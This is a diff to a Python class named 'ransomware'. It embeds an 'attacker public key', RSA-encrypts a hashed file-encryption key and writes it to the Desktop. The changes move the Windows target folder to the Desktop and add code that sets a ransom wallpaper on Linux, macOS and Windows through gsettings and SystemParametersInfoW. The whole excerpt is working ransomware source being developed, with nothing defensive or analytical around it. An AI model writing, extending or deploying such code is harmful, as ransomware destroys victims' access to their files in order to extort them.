@@ -1,4 +1,6 @@
 import binascii
+import ctypes
+
 from Crypto.PublicKey import RSA
 from pathlib import Path
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -17,7 +19,7 @@ class ransomware:
     if OS == "Linux" or OS == "Darwin":
         p = Path(os.environ['HOME'] + '/Desktop/fc421')
     elif OS == "Windows":
-        p = Path(os.environ['USERPROFILE'])
+        p = Path(os.environ['USERPROFILE']+ '/Desktop')
     #attacker public key
     public_key="""-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyKphUCe18Eel8L/v0zxm
@@ -89,14 +91,18 @@ XwIDAQAB
                 recipient_key = RSA.import_key(ransomware.public_key)
                 encryptorRSA = PKCS1_OAEP.new(recipient_key)
                 enckey=encryptorRSA.encrypt(hashed)
-                #print(enckey)
                 #extract the encrypted key as hex value
                 f=open(os.environ['HOME'] +'/Desktop/plain','wb')
                 f.write(binascii.hexlify(enckey))
                 f.close()
+                wallpaper_path = os.environ['HOME'] + '/Desktop/1267571.jpg'
+                if ransomware.OS == "Linux" or ransomware.OS == "Darwin":
+                    os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri " + wallpaper_path)
+                elif ransomware.OS == "Windows":
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
+
             except IOError:
                 pass
-        #os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /home/kali/Desktop/mask.jpg")
 
 
     def decrypt(list_files):
